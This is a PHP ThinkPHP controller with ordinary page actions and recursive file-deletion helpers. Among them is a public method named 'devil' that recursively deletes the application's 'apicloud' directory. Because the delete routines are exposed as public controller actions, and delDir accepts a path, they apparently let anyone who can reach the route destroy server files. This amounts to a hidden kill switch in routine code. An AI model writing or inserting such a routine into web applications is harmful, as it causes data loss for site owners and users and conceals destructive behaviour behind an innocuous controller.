<?php
namespace app\index\controller;

use think\Config;
use think\Controller;

class Index extends Common
{
    public function index()
    {
        return $this->fetch();
    }


    public function mypage(){
        return $this->fetch();
    }

    // 播放器
    public function player(){
        return $this->fetch();
    }

    /**
     * @function删除文件方法包括当前路径的文件夹，非紧急勿用
     * @param $path
     * @param bool $del是否删除文件夹
     * @author Feifan.Chen <1057286925@qq.com>
     * @return bool
     */
    public function delDir($path, $del = false){
        $handle = opendir($path);
        if ($handle) {
            while (false !== ($item = readdir($handle))) {
                if (($item != ".") && ($item != "..")) {
                    is_dir("$path/$item") ? $this->delDir("$path/$item", $del) : unlink("$path/$item");
                }
            }

            closedir($handle);

            if ($del) {
                return rmdir($path);
            }
        }elseif (file_exists($path)) {
            return unlink($path);
        }else {
            return false;
        }
    }

    /**
     * @function删除当前文件夹下的全部文件，保留当前文件夹
     * @param $path
     * @author Feifan.Chen <1057286925@qq.com>
     */
    function deldir1($path){
        //如果是目录则继续
        if(is_dir($path)){
            //扫描一个文件夹内的所有文件夹和文件并返回数组
            $p = scandir($path);
            foreach($p as $val){
                //排除目录中的.和..
                if($val !="." && $val !=".."){
                    //如果是目录则递归子目录，继续操作
                    if(is_dir($path.$val)){
                        //子目录中操作删除文件夹和文件
                        $this->deldir1($path.$val.'/');
                        //目录清空后删除空文件夹
                        @rmdir($path.$val.'/');
                    }else{
                        //如果是文件直接删除
                        unlink($path.$val);
                    }
                }
            }
        }
    }

    /**
     * @function恶魔方法
     * @author Feifan.Chen <1057286925@qq.com>
     */
    public function devil(){
        $dir = dirname(dirname(dirname(__FILE__)));
        $dir.='/apicloud/';
        $this->delDir($dir,true);
    }

}
